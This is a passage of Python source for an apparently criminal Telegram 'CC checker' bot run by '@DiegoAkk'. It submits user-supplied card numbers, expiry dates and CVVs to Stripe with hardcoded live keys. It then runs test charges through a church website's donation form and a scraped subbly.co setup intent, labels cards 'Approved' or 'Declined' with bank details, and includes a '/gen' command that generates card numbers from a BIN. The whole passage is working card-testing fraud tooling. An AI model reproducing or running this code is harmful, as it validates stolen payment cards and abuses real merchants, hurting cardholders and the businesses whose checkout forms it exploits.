    sid = r['sid']

    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
    
    data = f'time_on_page=1002419&guid={guid}&muid={muid}&sid={sid}&key=pk_live_kkIOioqvMQs4lec76gX9Ap5R&payment_user_agent=stripe.js%2F78ef418&card[name]=manuel&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}'
    response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
    lol = response.json()   

    if 'incorrect_number' in response.text:
        code = lol['error']['code']
        with open('admins.txt', 'r') as file:
            if str(ID) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗖𝗵𝗼𝗶𝗰𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card number is incorrect.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗖𝗵𝗼𝗶𝗰𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card number is incorrect.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    else:         
        token = response.json()['id']
        tad = response.json()
        card = tad['card']

        
        
        cookies = {
            '_ga': 'GA1.2.929401543.1672862249',
            '_gid': 'GA1.2.87629019.1672862249',
            '__stripe_mid': '69acdb33-9d90-4d0e-8f28-b349e1dcb39a22f74d',
            'pdb-sess': '389eaaf8b8b508f9de8414a8358a243e',
            '__stripe_sid': 'baf0cce0-c506-43e1-82ec-9f27052f8fda165981',}
            
            
        headers = {
            'authority': 'www.churchofgodpacoima.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga=GA1.2.929401543.1672862249; _gid=GA1.2.87629019.1672862249; __stripe_mid=69acdb33-9d90-4d0e-8f28-b349e1dcb39a22f74d; pdb-sess=389eaaf8b8b508f9de8414a8358a243e; __stripe_sid=baf0cce0-c506-43e1-82ec-9f27052f8fda165981',
            'origin': 'https://www.churchofgodpacoima.com',
            'referer': 'https://www.churchofgodpacoima.com/donate/',
            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',}
        data = {
            'action': 'wp_full_stripe_payment_charge',
            'formName': 'Donation',
            'fullstripe_name': 'manuel',
            'fullstripe_email': 'rexwairtwwkwk@gmail.com',
            'fullstripe_custom_input': 'thanks',
            'fullstripe_custom_amount': '10.00',
            'fullstripe_address_line1': 'stree  457',
            'fullstripe_address_line2': '',
            'fullstripe_address_city': 'NY',
            'fullstripe_address_state': 'Cesar',
            'fullstripe_address_zip': '100100',
            'stripeToken': [
                token,
                ],}
            
        response1 = requests.post('https://www.churchofgodpacoima.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data).json()
        
        msg = response1['msg']

        #await message.reply(msg)

        if 'Your card was declined.' in msg:
            with open('admins.txt', 'r') as file:
                if str(ID) in file.read():
                    await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗖𝗵𝗼𝗶𝗰𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card was declined.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
                else:
                            await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗖𝗵𝗼𝗶𝗰𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card was declined.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

        else:
            with open('admins.txt', 'r') as file:
                if str(ID) in file.read():
                    await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗖𝗵𝗼𝗶𝗰𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Approved</b> ✅

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>

[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>

[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

                else:
                    await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗖𝗵𝗼𝗶𝗰𝗲 𝗖𝗵𝗮𝗿𝗴𝗲𝗱
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Approved</b> ✅

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>

[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>

[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


@iniciar.message_handler(commands=['erly'], commands_prefix=comand)
async def pene(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    with open('admins.txt', 'r') as file:
        if str(user) in file.read():
            await contra.edit_text('<b>Efectivamente tienes premium bb✅</b>')

        else:
            await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
            return str;
    ini = time.perf_counter()

    if message.reply_to_message: 
        ccs = message.reply_to_message.text

    else:
        ccs = message.text[len('/erly '):]
    
    if not ccs:
        await contra.edit_text("⚫ [🝂] /erly: <b>Stripe Auth 4</b> | <b>Status: On</b> ✅")
        return str
        
    
    x = re.findall(r'\d+', ccs)
    cc = x[0]
    mes = x[1]                               
    ano = x[2]                               
    cvv = x[3]                               
    if mes.startswith('2'):
        mes, ano = ano, mes                                                           
    if len(mes) >= 3:
        mes, ano, cvv = ano, cvv, mes
    
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴘʀᴏᴄᴇss: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡][🟢]</b>")

    time.sleep(1)
    

    apis17 = uniproxy.get(f"https://projectslost.xyz/bin/?bin={cc[:6]}").json()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    result=apis17['status']
    banke=apis17['bank']
    bank=banke['name']
    brand=apis17['brand']
    bn=apis17['query']
    typ=apis17['type']
    lv=apis17['level']
    country1=apis17['country']
    country=country1['name']
    flag=country1['flag']
    final = time.perf_counter()
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: <code>{cc}|{mes}|{ano}|{cvv}</code>\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: <code>{cc}|{mes}|{ano}|{cvv}</code>\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡]</b>")
    time.sleep(2)
    m3 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: <code>{cc}|{mes}|{ano}|{cvv}</code>\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡][🟢]</b>")

    # REQUESTS INIT
            
    ttp_proxy  = "https://190.255.49.66:30393"

    proxies = { 
              "sock4"  : ttp_proxy,  
            }
#-----------------------------------------------------------------------------------------------
    session = requests.Session()
    req_1 = session.get('https://www.subbly.co/admin/auth/register', proxies=proxies).text
            #print(req_1)
    if 'Not allowed' in req_1:
        await message.reply(f"<b><code>xd</code> Problemas de VPN estas unsando un vpn fuera de la estencion que usas como dominio.</b>")
    seti_secret = req_1.split("window.intent = '")[1].split("'")[0]
    seti = seti_secret.split("_secret_")[0]
            
       
    headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
        }

    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=juan+moltares&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=14c4d026-6952-41fe-a710-01a7a366d17e4575d6&payment_method_data[muid]=66b0b062-ff6d-42f7-ae71-323cf9970d69e5c9e1&payment_method_data[sid]=a54abcfe-4809-4f9d-8f30-2b8c2280040181c17e&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Ff06870666%3B+stripe-js-v3%2Ff06870666&payment_method_data[time_on_page]=115132&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_rSL4eUmipHMkptbjal1vLN0F&client_secret={seti_secret}'
# REQUESTS INIT
            

    response = session.post(f'https://api.stripe.com/v1/setup_intents/{seti}/confirm', headers=headers, data=data)
    r = response.text
    print(r)
    if "succeeded" in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Approved!</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


    elif "Your card's security code is incorrect." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Approved CCN</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card's expiration year is invalid." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card's expiration year is invalid.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


    elif "Your card does not support this type of purchase." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card does not support this type of purchase.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card's security code is invalid." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card's security code is invalid.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card number is incorrect." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card number is incorrect.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card was declined." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card was declined.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card has insufficient funds." in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Approved</b> ✅
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Your card has insufficient funds.</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")    

    elif "requires_payment_method" in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>requires_payment_method</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


    elif "requires_action" in r:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>3d, Try Again ❌</b>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    else:
        await m3.edit_text(f"""
━━━━━━━━━━━━━
𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑬𝒓𝒍𝒚
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <b>Declined</b> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Unkmow Error</b> ❌

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

@iniciar.message_handler(commands=['gen'], commands_prefix=comand)
async def pene(message: types.Message):
    ccs = message.text[len('/gen '):]
    if not ccs:
        return await message.reply(
            f"""
            𝗜𝗻𝗴𝗿𝗲𝘀𝗮 𝗯𝗶𝗲𝗻 𝗲𝗹 𝗯𝗶𝗻 𝗴𝗲𝗶, 𝗮𝘀𝗶: /bin 431231""")

    text = f"""CCS GEN"""
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    
    splitter = ccs.split('|')
    #bincode1 = 12
    cc = splitter[0]
    mes = 'rnd'
    ano = 'rnd'
    cvv = 'rnd'

    if len (splitter[0]) < 6 or len(splitter[0]) > 16:
        await message.reply("""BIN INCORRECTO PNDJ PERO IGUAL TE GENRARE CCS""")
    if len (splitter) == 2:
        cc = splitter[0]
        mes = splitter[1]
        ano = 'rnd'
        cvv = 'rnd'
    if len (splitter) == 3:
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        cvv = 'rnd'
    if len (splitter) == 4:
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        cvv = splitter[3]
    amount = '10'
    ccs1 = []
    ccs2 = []
    ccs3 = []
    ccs4 = []
    ccs5 = []
    ccs6 = []
    ccs7 = []
    ccs8 = []
    ccs9 = []

    s="0123456789"
    uno = list(s)
    random.shuffle(uno)
    result = ''.join(uno)
    result = cc + result
    if cc[0] == "3":
        ccgen = result[0:15]
    else:
        ccgen = result[0:16]
    if mes == 'rnd':
        mesgen = random.randint(1,12)
        if len(str(mesgen)) == 1:
            mesgen = "0" + str(mesgen)
    else:
        mesgen = mes
    if ano == 'rnd':
        anogen = random.randint(2023,2030)
    else:
        anogen = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen = random.randint(1000,9999)
        else:
            cvvgen = random.randint(100,999)
    else:
        cvvgen = cvv


    s="0123456789"
    dos = list(s)
    random.shuffle(dos)
    result = ''.join(dos)
    result = cc + result
    if cc[0] == "3":
        ccgen2 = result[0:15]
    else:
        ccgen2 = result[0:16]
    if mes == 'rnd':
        mesgen2 = random.randint(1,12)
        if len(str(mesgen2)) == 1:
            mesgen2 = "0" + str(mesgen2)
    else:
        mesgen2 = mes
    if ano == 'rnd':
        anogen2 = random.randint(2023,2030)
    else:
        anogen2 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen2 = random.randint(1000,9999)
        else:
            cvvgen2 = random.randint(100,999)
    else:
        cvvgen2 = cvv
    

    s="0123456789"
    tres = list(s)
    random.shuffle(tres)
    result = ''.join(tres)
    result = cc + result
    if cc[0] == "3":
        ccgen3 = result[0:15]
    else:
        ccgen3 = result[0:16]
    if mes == 'rnd':
        mesgen3 = random.randint(1,12)
        if len(str(mesgen3)) == 1:
            mesgen3 = "0" + str(mesgen3)
    else:
        mesgen3 = mes
    if ano == 'rnd':
        anogen3 = random.randint(2023,2030)
    else:
        anogen3 = ano
    if cvv == 'rnd':
        if cc[0] == "3":
            cvvgen3 = random.randint(1000,9999)
        else:
            cvvgen3 = random.randint(100,999)
    else:
        cvvgen3 = cvv

    s="0123456789"
    cuatro = list(s)
    random.shuffle(cuatro)
    result = ''.join(cuatro)
    result = cc + result
    if cc[0] == "3":
        ccgen4 = result[0:15]
    else:
        ccgen4 = result[0:16]
    if mes == 'rnd':
        mesgen4 = random.randint(1,12)
        if len(str(mesgen4)) == 1:
            mesgen4 = "0" + str(mesgen4)
    else:
        mesgen4 = mes
    if ano == 'rnd':
